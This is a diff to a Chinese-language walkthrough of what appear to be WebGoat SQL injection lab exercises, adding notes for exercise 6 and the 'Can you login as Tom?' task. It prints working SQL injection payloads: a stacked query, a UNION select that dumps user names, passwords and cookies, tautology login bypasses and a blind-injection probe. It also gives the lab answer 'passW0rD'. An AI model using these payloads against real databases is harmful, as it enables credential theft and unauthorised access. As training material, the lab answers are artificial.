@@ -164,10 +164,26 @@ SQL 查询链就是一个跟在另一个查询后面。你可以使用标记查�
 - 结合型技术
 - 盲注
 
-6.a 键入命令```' OR '1'='1';  select * from user_system_data --```
+题目6.a 键入命令```' OR '1'='1';  select * from user_system_data --```
 
 也可以使用union语句完成：```' or 1=1  union select userid, user_name, password,cookie,'1','1',1 from user_system_data -- ```
 
 
-6.b ```passW0rD```
+题目6.b ```passW0rD```
 
+
+题目"Can you login as Tom?"。这个题先注册一个用户（例如leo/123456)。
+
+- 尝试正确登录leo/123456，然后会收到提示“Try To login as Tom!”
+- 尝试错误Tom/123456，会反馈“No results matched. Try Again.”
+
+可以看到查询正确与错误会有两种不同的反馈，但不会有更多的输出。
+
+```leo' union select 1 or '1'='1```
+
+```123456' or '1'='1```
+
+不行，substring(database_version(),1,1) = 5
+
+
+username_reg=leo&email_reg=123%40111.COM&password_reg=123&confirm_password_reg=123
